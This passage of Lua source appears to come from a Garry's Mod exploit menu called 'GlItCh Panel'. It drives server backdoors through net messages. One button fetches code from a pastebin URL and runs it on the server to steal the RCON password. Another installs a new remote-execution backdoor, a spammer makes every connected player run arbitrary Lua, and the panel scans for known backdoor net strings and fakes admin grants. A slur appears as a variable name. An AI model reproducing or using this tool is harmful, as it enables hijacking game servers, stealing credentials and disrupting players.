"chat.AddText(Color(255, 0, 0, 255), \"Console:⚠️Oh No Looks Like Server.exe has Stopped Working...\")",
"chat.AddText(Color(255, 0, 0, 255), \"Console:⚠️Oh No Looks Like Server.exe has Stopped Working...\")",
}
        ChatSPAMM = !ChatSPAMM
        if( ChatSPAMM ) then
                timer.Create( "SPAMMER101", 0.0001, 0, function()
                    net.Start(exploitent)
                    net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([["..table.Random(RainbowMike).."]]) end " )
                    net.WriteBit (1)
                    net.SendToServer()
                end )
        else
                timer.Destroy( "SPAMMER101" )
 
 
        end
    end
local commandnethtx28 = vgui.Create("DButton", DScrollPanel)
commandnethtx28:SetSize( 208, 20 )
commandnethtx28:SetPos( 2, 775 )
commandnethtx28:SetText("STEAL RCON PASSWORD")
commandnethtx28:SetTextColor(Color(255, 255, 255, 255))
commandnethtx28.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(255, 196, 0, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx28.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
net.Start(exploitent)
net.WriteString( "http.Fetch(\"https://pastebin.com/V054AVp3\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
timer.Simple( 0.5, function()
if DGE.ValidNetString( "jeveuttonrconleul" ) then
net.Start("jeveuttonrconleul")
net.SendToServer()
else
chat.AddText( Color(255, 0, 0, 255),"rcon_password Failed" )
end
end )
end
local RconCommand = vgui.Create( "DTextEntry", DScrollPanel )
RconCommand:SetPos( 110, 0 )
RconCommand:SetSize( 100, 20 )
RconCommand:SetText( "hostname Hacked by GlItCh [] Server.exe has stopped working" )
local Lancer_rcon_commande = vgui.Create("DButton", DScrollPanel )
Lancer_rcon_commande:SetSize( 103, 20 )
Lancer_rcon_commande:SetPos( 2, 0 )
Lancer_rcon_commande:SetText("RCON Command")
Lancer_rcon_commande:SetTextColor(Color(255, 255, 255, 255))
Lancer_rcon_commande.Paint = function(panel, w, h)
surface.SetDrawColor(255, 242, 0, 255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
Lancer_rcon_commande.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Rcon Team Sent" )
local rcon_commandes_get = RconCommand:GetValue()
DGE.NetStart(exploitent)
net.WriteString( rcon_commandes_get )
net.WriteBit(false)
net.SendToServer()
end
local GLUACommand = vgui.Create( "DTextEntry", DScrollPanel )
GLUACommand:SetPos( 110, 25 )
GLUACommand:SetSize( 100, 20 )
GLUACommand:SetText( "util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)" ) -- timer.Create(\"Timerdecrash\",0.5,1,function() while true do end end)
local Lancer_glua_commande = vgui.Create("DButton", DScrollPanel )
Lancer_glua_commande:SetSize( 103, 20 )
Lancer_glua_commande:SetPos( 2, 25 )
Lancer_glua_commande:SetText("Lua Run")
Lancer_glua_commande:SetTextColor(Color(255, 255, 255, 255))
Lancer_glua_commande.Paint = function(panel, w, h)
surface.SetDrawColor(255, 242, 0, 255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
Lancer_glua_commande.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Lua code sent" )
local glua_commandes_get = GLUACommand:GetValue()
DGE.NetStart(exploitent)
net.WriteString( glua_commandes_get )
net.WriteBit(1)
net.SendToServer()
end
end
net.Receive( "rcon_passw_dump", function()
local rcon_pass = net.ReadString()
chat.AddText( Color(255, 255, 255), rcon_pass, Color(0, 255, 0)," GG with this you can break the server even if it removes the backdoor :D")
end )
net.Receive( "aucun_rcon_ici", function()
chat.AddText( Color(255, 0, 0),"No rcon_password on the server:/" )
end )
function DGE.MakePlayerSelectionButton( parent, x, y, addr )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( "Select player" )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 90, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(70, 70, 100, 255) )
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
DGE.SelectPlayersPanel( addr )
end
return TButton:GetWide(), TButton:GetTall()
end
function DGE.SelectPlayersPanel( addr )
if DGE.PlayerSelector and DGE.PlayerSelector:IsVisible() then DGE.PlayerSelector:Remove() end
local plytab = DGE.GetStored( addr, {} )
DGE.PlayerSelector = vgui.Create("DFrame")
DGE.PlayerSelector:SetSize(250,400)
DGE.PlayerSelector:SetTitle("Target selection")
DGE.PlayerSelector:SetPos( gui.MouseX(), gui.MouseY() )
DGE.PlayerSelector:MakePopup()
DGE.PlayerSelector.Paint = function( s, w, h )
if !DGE.Menu or !DGE.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local Plist = vgui.Create( "DPanelList", DGE.PlayerSelector )
Plist:SetSize( DGE.PlayerSelector:GetWide() - 10, DGE.PlayerSelector:GetTall() - 55 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 5, 40 )
Plist:SetName( "" )
local target1 = vgui.Create("DButton", DGE.PlayerSelector)
target1:SetSize( 40, 20 )
target1:SetPos( 10, 23 )
target1:SetText("All")
target1:SetTextColor(Color(255, 255, 255, 255))
target1.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target1.DoClick = function()
for _, p in pairs(player.GetAll()) do
if not table.HasValue( plytab, p ) then
table.insert( plytab, p )
end
end
DGE.Store( addr, plytab )
end
local target2 = vgui.Create("DButton", DGE.PlayerSelector)
target2:SetSize( 40, 20 )
target2:SetPos( 55, 23 )
target2:SetText("No one")
target2:SetTextColor(Color(255, 255, 255, 255))
target2.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target2.DoClick = function()
table.Empty( plytab )
DGE.Store( addr, plytab )
end
local target3 = vgui.Create("DButton", DGE.PlayerSelector )
target3:SetSize( 40, 20 )
target3:SetPos( 100, 23 )
target3:SetText("You")
target3:SetTextColor(Color(255, 255, 255, 255))
target3.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target3.DoClick = function()
table.Empty( plytab )
table.insert( plytab, LocalPlayer() )
DGE.Store( addr, plytab )
end
local target4 = vgui.Create( "DTextEntry", DGE.PlayerSelector )
target4:SetPos( 145, 23 )
target4:SetSize( 95, 20 )
target4:SetText( "" )
target4.OnChange = function( self )
local nam = self:GetValue()
local namtab = string.Explode( ", ", nam )
table.Empty( plytab )
for _, pl in pairs( player.GetAll() ) do
for _, s in pairs( namtab ) do
if string.find( string.lower( pl:Nick() ), s ) then
table.insert( plytab, pl )
end
end
end
DGE.Store( addr, plytab )
end
for k, v in pairs( player.GetAll() ) do
local plypanel2 = vgui.Create( "DPanel" )
plypanel2:SetPos( 0, 0 )
plypanel2:SetSize( 200, 25 )
local teamcol = team.GetColor( v:Team() )
plypanel2.Paint = function( s, w, h )
if !v:IsValid() then return end
surface.SetDrawColor( Color(30, 30, 30, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( teamcol )
surface.DrawRect( 0, h - 3, w, 3 )
surface.SetDrawColor( Color(55, 55, 55, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
if table.HasValue( plytab, v ) then surface.SetDrawColor( Color(55, 255, 55, 245) ) end
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local plyname = vgui.Create( "DLabel", plypanel2 )
plyname:SetPos( 10, 5 )
plyname:SetFont( "Trebuchet18" )
local tcol = Color( 255, 255, 255 )
if v == LocalPlayer() then tcol = Color( 155, 155, 255 ) end
plyname:SetColor( tcol )
plyname:SetText( v:Nick() )
plyname:SetSize(180, 15)
local faggot = vgui.Create("DButton", plypanel2 )
faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
faggot:SetPos( 0, 0 )
faggot:SetText("")
faggot.Paint = function(panel, w, h)
return
end
faggot.DoClick = function()
if table.HasValue( plytab, v ) then
table.RemoveByValue( plytab, v )
else
table.insert( plytab, v )
end
DGE.Store( addr, plytab )
end
Plist:AddItem( plypanel2 )
end
end
function DGE.MakeTextInputButton( parent, x, y, btext, default, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local tentry = vgui.Create( "DTextEntry", hostframe )
tentry:SetPos( 10 + tttt:GetWide(), 2 )
tentry:SetSize( 130, 20 )
tentry:SetText( DGE.GetStored( addr, default ) )
tentry.OnChange = function( self )
DGE.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + tentry:GetWide(), 24 )
return hostframe:GetWide(), hostframe:GetTall()
end
function DGE.MakeNumberInputButton( parent, x, y, btext, default, min, max, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local wrangle = vgui.Create( "DNumberWang", hostframe )
wrangle:SetPos( 10 + tttt:GetWide(), 2 )
wrangle:SetSize( 75, 20 )
wrangle:SetDecimals( 2 )
wrangle:SetMinMax( min , max )
wrangle:SetValue( DGE.GetStored( addr, default ) )
wrangle:SetAllowNonAsciiCharacters(false)
wrangle.OnValueChanged = function( self, val )
DGE.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + wrangle:GetWide(), 24 )
return hostframe:GetWide(), hostframe:GetTall()
end
local FillFrameRates = RatesScaleLevel
concommand.Add( "GLP", function()
if FillFrameRates == "STEAM_0:0:0" -- Single game (just in case)
or true
then
LocalPlayer():EmitSound("weapons/ar2/ar2_reload_push.wav",500,100)
DGE.Menu = vgui.Create("DFrame")
DGE.Menu:SetSize(1400,820)
DGE.Menu:SetTitle("")
DGE.Menu:Center()
DGE.Menu:MakePopup()
DGE.Menu.gay = table.Count( DGE.sploits )
DGE.Menu.Paint = function( s, w, h )
surface.SetDrawColor(Color(0, 0, 0, 247) ) -- Color side menu (41 41 41)
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(255, 0, 0, 255) ) -- Stroke menu outline
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.SetDrawColor( Color(48, 48, 48, 225) ) -- Color menu in the center
surface.DrawRect( 389, 25, w - 400, h - 35 )
surface.SetDrawColor( Color(255, 255, 255, 255) )
draw.DrawText( "GlItCH Panel Version 3.1.1\nExploits: "..DGE.Menu.gay, "default", 8, 15, Color(255, 255, 255, 255) )
end
local Plist = vgui.Create( "DPanelList", DGE.Menu )
Plist:SetSize( DGE.Menu:GetWide() - 400, DGE.Menu:GetTall() - 35 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 389, 25 )
Plist:SetName( "" )
DGE.MakeFunctionButtonr( DGE.Menu, 7, 50,  "Welcome to the GlItCH Panel Choose from tons of Exploits to use...", gui.url, "SHOWING MENU IS ONLINE" )
DGE.MakeFunctionButtonr( DGE.Menu, 7, 80,  "ServerSecurity         ", anticheats, "Shows security measures. (Screenrabes, anti-cheats, etc.)" )
DGE.MakeFunctionButtonb( DGE.Menu, 7, 110, "Ghost Noclip             ", Noclip, "GlItCh Ghost Noclip Click=TURN ON Click again= OFF" )
DGE.MakeFunctionButtonb( DGE.Menu, 7, 169, "Backdoorscanv1       ", checkbackdoors, "Servers Backdoors (look at the console)" )
DGE.MakeFunctionButtonb( DGE.Menu, 7, 229, "FakeAdmin               ", lmfao, "Fake ULX issuing SuperAdmin, For Trolling Purposes" )
DGE.MakeFunctionButtonb( DGE.Menu, 7, 259, "DiscoMode               ", lmfao1, "FUN DANCE MODE!!" )
DGE.MakeFunctionButtonb( DGE.Menu, 7, 349, "RainbowPhys           ", rainbowphysgun, "Includes Rainbow Physgun on Clientside possible Serverside" )
DGE.MakeFunctionButtonb( DGE.Menu, 7, 379, "FakeOwner              ", boi1, "Fake ULX issuing Owner, For Trolling Purposes" )
DGE.MakeFunctionButtonb( DGE.Menu, 7, 410, "PartyPhys                ", partyphysgun, "Includes Rainbow Physgun on Clientside possible Serverside" )
local function CreateSploitPanel( name, t )
if !DGE.Menu then return end
local cmdp = vgui.Create( "DPanel" )
cmdp:SetSize( Plist:GetWide(), 70 )
cmdp.Cmd = name
cmdp.Desc = t.desc
cmdp.Paint = function( s, w, h )
surface.SetDrawColor( Color(41, 41, 41, 245) ) -- The color of the exploits
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( severitycols[t.severity] )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawLine( 0, 24, w, 24 )
draw.DrawText( cmdp.Cmd, "DermaDefault", 10, 5, Color(255, 255, 255, 255) )   --Button Title Text Color
draw.DrawText( cmdp.Desc, "DermaDefault", 10, 28, Color(255, 255, 255, 255) )   --Button Text Color 
end
local x = 10
for _, tab in ipairs( t.functions ) do
if tab.typ == "func" then
x = (x + 5) + DGE.MakeFunctionButton( cmdp, x, 42, tab.name, tab.func )
elseif tab.typ == "players" then
x = (x + 5) + DGE.MakePlayerSelectionButton( cmdp, x, 42, tab.addr )
elseif tab.typ == "htxcommandeliste" then
x = (x + 5) + DGE.HTXBackdoor( cmdp, x, 42, tab.name )
elseif tab.typ == "soundboard" then
x = (x + 5) + DGE.SoundBoard( cmdp, x, 42, tab.name )
elseif tab.typ == "string" then
x = (x + 5) + DGE.MakeTextInputButton( cmdp, x, 42, tab.name, tab.default, tab.addr )
if !DGE.IsStored( tab.addr ) then DGE.Store( tab.addr, tab.default ) end
elseif tab.typ == "float" then
x = (x + 5) + DGE.MakeNumberInputButton( cmdp, x, 42, tab.name, tab.default, tab.min, tab.max, tab.addr )
if !DGE.IsStored( tab.addr ) then DGE.Store( tab.addr, tab.default ) end
end
end
Plist:AddItem( cmdp )
end
for k, v in pairs( DGE.sploits ) do
if v.scan() then CreateSploitPanel( k, v ) end
end
else
return end
end)

--[[ --------------------------------------------------------------
                           ULX FAKE SUPERADMIN HACK
    ---------------------------------------------------------------]]
 
function lmfao()
surface.PlaySound("garrysmod/ui_click.wav")
if( ulx ) then
chat.AddText( Color( 0, 0, 0, 255 ), "(Console) ", Color( 160, 200, 200, 255 ), "added ", Color( 80, 0, 120, 255 ), "You ", Color( 160, 200, 200, 255 ), "to group ", Color( 0, 255, 0, 255 ), "superadmin" )
else
chat.AddText( "This Server Doesnt appear to Have ULX" )
end
end
CCA( "GLP_adduser", lmfao )
 
--[[ --------------------------------------------------------------
                            ULX FAKE OWNER HACK
    ---------------------------------------------------------------]]
 
function boi1()
surface.PlaySound("garrysmod/ui_click.wav")
if( ulx ) then
chat.AddText( Color( 0, 0, 0, 255 ), "(Console) ", Color( 160, 200, 200, 255 ), "added ", Color( 80, 0, 120, 255 ), "You ", Color( 160, 200, 200, 255 ), "to group ", Color( 0, 255, 0, 255 ), "Owner" )
else
chat.AddText( "This Server Doesnt appear to Have ULX" )
end
end
CCA( "GLP_adduser", boi1 )
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
--[[ --------------------------------------------------------------
                            SELF DISCO MODE
    ---------------------------------------------------------------]]
 
function lmfao1()
surface.PlaySound("garrysmod/ui_click.wav")
local msg = "Wait. . ."
surface.CreateFont("lolwutbet", {size=75})
local function huddrawdetour()
    draw.RoundedBox(0, 0, 0, ScrW(), ScrH(), HSVToColor( CurTime() % 6 * 60, 1, 1 ))
    draw.RoundedBox(0, 0, ScrH() / 3.5, ScrW(), ScrH() / 4.5, Color(0, 0, 0))
    draw.SimpleText(msg, "lolwutbet", ScrW() / 2, ScrH() / 2.5, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
 
 
for k,v in pairs(hook.GetTable()) do
    for o,j in pairs(v) do
        if k == "HUDPaint" then
            hook.Remove(k, o)
            hook.Add(k, o, huddrawdetour)
        end
    end
end
hook.Add("HUDPaint","eztoirkfghdjbnvxc", huddrawdetour)
 
timer.Create("Scripting101",2 ,0 , function()
    msg = table.Random({
        "GlItCh MEME IS MEMING",
        "cl_yawspeed 0",
        "Time for you To Spind",
        "Scripting...",
        "Scripting...",
        "ALRIGHT STARTING MEME POWER",
        "SCRIPTING MEME...",
        "MEME POWER 100%",
        "MEME POWER MAXED",
        "u noob",
        "YOU SHALL FEEL THE FULL MEME POWER",
        "cl_yawspeed 8",
        "ENJOY...AND STOP Being Rude ok??",
        "..."})
end)
 
timer.Create("lgfholjghlfdsh",0 ,0 , function()
    MsgC(HSVToColor( CurTime() % 6 * 60, 1, 1 ), "THE GlItCh SYSTEMS HAVE MEMED YOUR SERVER!!!!!!!\n")
end)
sound.PlayURL("http://d.zaix.ru/5Kko.mp3","mono noblock", function( s )
    s:Play()
end)
LocalPlayer():ConCommand("+voicerecord")
LocalPlayer():ConCommand("cl_yawspeed 9999999")
LocalPlayer():ConCommand("+right")
MsgC(HSVToColor( CurTime() % 6 * 60, 1, 1 ), "Najmi escape !\n")
timer.Simple(5 * 60, function()
    table.Empty(debug.getregistry())
end )
end
concommand.Add( "Music_troll", lmfao1 )
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local ulxflood = false
local netKey = ""
local Defqon = nil 
if ulx then ulx.showMotdMenu = function() end end
local iZNX = {}
iZNX.memory = {}
local grad = Material( "gui/gradient" )
local upgrad = Material( "gui/gradient_up" )
local downgrad = Material( "gui/gradient_down" )
local ctext = chat.AddText
surface.CreateFont("HUDLogo2",{size = 35, weight = 100, antialias = 0})

timer.Create("timerversionchecker",99999999999999999999999999999999,1,function()
hook.Remove("HUDPaint", "HudVersionChecker")
end)
hook.Add("HUDPaint", "HudVersionChecker", function()
draw.SimpleTextOutlined( "Thanks For Using GLP Free..."..steamworks.GetPlayerName( LocalPlayer():SteamID64() )..", www.lmccoding.weebly.com", "HUDLogo2", ScrW()/2 + math.sin(RealTime()) * ScrW() / 15, ScrH()/30, Color(255, 0, 0, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,255) )
end)
function playSound(url)

    sound.PlayURL(url, '', function( station ) 

        if ( IsValid( station ) ) then

        station:SetPos( LocalPlayer():GetPos() )
        station:Play()

        end
    end)

end

if (_G.QAC or _G.CAC) then
        surface.PlaySound("ambient/alarms/klaxon1.wav")
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "The server has Cake Anti Cheat!")
end
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local ply = LocalPlayer()
function Noclip()
surface.PlaySound("garrysmod/ui_click.wav")
ply:ConCommand( "GNC" )
end
local SW = {}
SW.Enabled = false
SW.ViewOrigin = Vector( 0, 0, 0 )
SW.ViewAngle = Angle( 0, 0, 0 )
SW.Velocity = Vector( 0, 0, 0 )
function SW.CalcView( ply, origin, angles, fov )
    if ( !SW.Enabled ) then return end
        if ( SW.SetView ) then
        SW.ViewOrigin = origin
        SW.ViewAngle = angles
        SW.SetView = false
        end
    return { origin = SW.ViewOrigin, angles = SW.ViewAngle }
end
hook.Add( "CalcView", "SpiritWalk", SW.CalcView )
function SW.CreateMove( cmd )
    if ( !SW.Enabled ) then return end
           
    local time = FrameTime()
    SW.ViewOrigin = SW.ViewOrigin + ( SW.Velocity * time )
    SW.Velocity = SW.Velocity * 0.95

    local sensitivity = 0.022
    SW.ViewAngle.p = math.Clamp( SW.ViewAngle.p + ( cmd:GetMouseY() * sensitivity ), -89, 89 )
    SW.ViewAngle.y = SW.ViewAngle.y + ( cmd:GetMouseX() * -1 * sensitivity )
           

    local add = Vector( 0, 0, 0 )
    local ang = SW.ViewAngle
    if ( cmd:KeyDown( IN_FORWARD ) ) then add = add + ang:Forward() end
    if ( cmd:KeyDown( IN_BACK ) ) then add = add - ang:Forward() end
    if ( cmd:KeyDown( IN_MOVERIGHT ) ) then add = add + ang:Right() end
    if ( cmd:KeyDown( IN_MOVELEFT ) ) then add = add - ang:Right() end
    if ( cmd:KeyDown( IN_JUMP ) ) then add = add + ang:Up() end
    if ( cmd:KeyDown( IN_DUCK ) ) then add = add - ang:Up() end
    add = add:GetNormal() * time * 3000
    if ( cmd:KeyDown( IN_SPEED ) ) then add = add * 2 end
           
    SW.Velocity = SW.Velocity + add
    if ( SW.LockView == true ) then
      SW.LockView = cmd:GetViewAngles()
    end
    if ( SW.LockView ) then
        cmd:SetViewAngles( SW.LockView )
    end
    cmd:SetForwardMove( 0 )
    cmd:SetSideMove( 0 )
    cmd:SetUpMove( 0 )
end
hook.Add( "CreateMove", "SpiritWalk", SW.CreateMove )
    function SW.Toggle()
    SW.Enabled = !SW.Enabled
    SW.LockView = SW.Enabled
    SW.SetView = true          
    local status = { [ true ] = "ON", [ false ] = "OFF" }
end
concommand.Add( "GNC", SW.Toggle )

function ValidNetString( str )
    local status, error = pcall( net.Start, str )
    return status
end

 Version = "v3.1.1"
-- BACKDOOR SCANS
function checkbackdoors()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText( Color(255, 0, 0, 255), "[GLP BACKDOOR]", Color( 255, 255, 255 ),"Look at the console" )
if( ValidNetString("Sbox_darkrp") ) then
        print( "[GlItCh] Found Backdoor! -   Sbox_darkrp" )
    end
 
if( ValidNetString("_GlItCh") ) then
        print( "[GlItCh] Found Backdoor! -   fijiconn" )
    end
 
if( ValidNetString("_GlItCh") ) then
        print( "[GlItCh] Found Backdoor! -   _GlItCh" )
    end
 
if( ValidNetString("Sandbox_ArmDupe") ) then
        print( "[GlItCh] Found Backdoor! -   Sandbox_ArmDupe" )
    end
if( ValidNetString("Sbox_itemstore") ) then
        print( "[GlItCh] Found Backdoor! -   Sbox_itemstore" )
    end
if( ValidNetString("Ulib_Message") ) then
        print( "[GlItCh] Found Backdoor! -   Ulib_Message" )
end
if( ValidNetString("ULogs_Info") ) then
        print( "[GlItCh] Found Backdoor! -   ULogs_Info" )
end
if( ValidNetString("ITEM") ) then
        print( "[GlItCh] Found Backdoor! -   ITEM" )
end
if( ValidNetString("fix") ) then
        print( "[GlItCh] Found Backdoor! -   fix" )
end
if( ValidNetString("Fix_Keypads") ) then
        print( "[GlItCh] Found Backdoor! -   Fix_Keypads" )
end
if( ValidNetString("Remove_Exploiters") ) then
        print( "[GlItCh] Found Backdoor! -   Remove_Exploiters" )
end
if( ValidNetString("noclipcloakaesp_chat_text") ) then
        print( "[GlItCh] Found Backdoor! -   noclipcloakaesp_chat_text" )
end
if( ValidNetString("_CAC_ReadMemory") ) then
        print( "[GlItCh] Found Backdoor! -   _CAC_ReadMemory" )
end
if( ValidNetString("nostrip") ) then
        print( "[GlItCh] Found Backdoor! -   nostrip" )
end
if( ValidNetString("nocheat") ) then
        print( "[GlItCh] Found Backdoor! -   nocheat" )
end
if( ValidNetString("LickMeOut") ) then
        print( "[GlItCh] Found Backdoor! -   LickMeOut" )
end
if( ValidNetString("ULX_QUERY2") ) then
        print( "[GlItCh] Found Backdoor! -   ULX_QUERY2" )
end
if( ValidNetString("MoonMan") ) then
        print( "[GlItCh] Found Backdoor! -   MoonMan" )
end
if( ValidNetString("Im_SOCool") ) then
        print( "[GlItCh] Found Backdoor! -   Im_SOCool" )
end
if( ValidNetString("Sandbox_GayParty") ) then
        print( "[GlItCh] Found Backdoor! -   Sandbox_GayParty" )
end
if( ValidNetString("DarkRP_UTF8") ) then
        print( "[GlItCh] Found Backdoor! -   DarkRP_UTF8" )
end
if( ValidNetString("oldNetReadData") ) then
        print( "[GlItCh] Found Backdoor! -   oldNetReadData" )
end
if( ValidNetString("memeDoor") ) then
        print( "[GlItCh] Found Backdoor! -   memeDoor" )
end
if( ValidNetString("BackDoor") ) then
        print( "[GlItCh] Found Backdoor! -   BackDoor" )
end
if( ValidNetString("OdiumBackDoor") ) then
        print( "[GlItCh] Found Backdoor! -   OdiumBackDoor" )
end
if( ValidNetString("cucked") ) then
        print( "[GlItCh] Found Backdoor! -   cucked" )
end
if( ValidNetString("NoNerks") ) then
        print( "[GlItCh] Found Backdoor! -   NoNerks" )
end
if( ValidNetString("kek") ) then
        print( "[GlItCh] Found Backdoor! -   kek" )
end
if( ValidNetString("ZimbaBackDoor") ) then
        print( "[GlItCh] Found Backdoor! -   ZimbaBackDoor" )
end
if( ValidNetString("something") ) then
        print( "[GlItCh] Found Backdoor! -   something" )
end
if( ValidNetString("random") ) then
        print( "[GlItCh] Found Backdoor! -   random" )
end
if( ValidNetString("strip0") ) then
        print( "[GlItCh] Found Backdoor! -   strip0" )
end
if( ValidNetString("DarkRP_AdminWeapons") ) then
        print( "[GlItCh] Found Backdoor! -   DarkRP_AdminWeapons" )
end
if( ValidNetString("SessionBackdoor") ) then
        print( "[GlItCh] Found Backdoor! -   SessionBackdoor" )
end
if( ValidNetString("ULXQUERY2") ) then
        print( "[GlItCh] Found Backdoor! -   ULXQUERY2" )
end
if( ValidNetString("fellosnake") ) then
        print( "[GlItCh] Found Backdoor! -   fellosnake" )
end
if( ValidNetString("enablevac") ) then
        print( "[GlItCh] Found Backdoor! -   enablevac" )
end
if( ValidNetString("idk") ) then
        print( "[GlItCh] Found Backdoor! -   idk" )
end
if( ValidNetString("c") ) then
        print( "[GlItCh] Found Backdoor! -   c" )
end
if( ValidNetString("killserver") ) then
        print( "[GlItCh] Found Backdoor! -   killserver" )
end
if( ValidNetString("fuckserver") ) then
        print( "[GlItCh] Found Backdoor! -   fuckserver" )
end
if( ValidNetString("cvaraccess") ) then
        print( "[GlItCh] Found Backdoor! -   cvaraccess" )
end
if( ValidNetString("rcon") ) then
        print( "[GlItCh] Found Backdoor! -   rcon" )
end
if( ValidNetString("rconadmin") ) then
        print( "[GlItCh] Found Backdoor! -   rconadmin" )
end
if( ValidNetString("web") ) then
        print( "[GlItCh] Found Backdoor! -   web" )
end
if( ValidNetString("jesuslebg") ) then
        print( "[GlItCh] Found Backdoor! -   jesuslebg" )
end
if( ValidNetString("zilnix") ) then
        print( "[GlItCh] Found Backdoor! -   zilnix" )
end
if( ValidNetString("Þà?D)◘") ) then
        print( "[GlItCh] Found Backdoor! -   Þà?D)◘" )
end
if( ValidNetString("disablebackdoor") ) then
        print( "[GlItCh] Found Backdoor! -   disablebackdoor" )
end
if( ValidNetString("ulx_worm") ) then
        print( "[GlItCh] Found Backdoor! -   ulx_worm" )
end
if( ValidNetString("awarn_remove") ) then
        print( "[GlItCh] Found Backdoor! -   awarn_remove" )
end
if( ValidNetString("ServerSoocks") ) then
        print( "[GlItCh] Found Backdoor! -   ServerSoocks" )
end
if( ValidNetString("kill") ) then
        print( "[GlItCh] Found Backdoor! -   kill" )
end
if( ValidNetString("GlItChBackdoor") ) then
        print( "[GlItCh] Found a Backdoor! -   Open Backdoor?" )
end
end
 
 
-- Auto-Backdoor checker
    if( ValidNetString("memeDoor") ) then
        netKey = "memeDoor"
    else
    end
 
    if( ValidNetString("Sandbox_Armdupe") ) then
        netKey = "Sandbox_Armdupe"
    else
    end
 
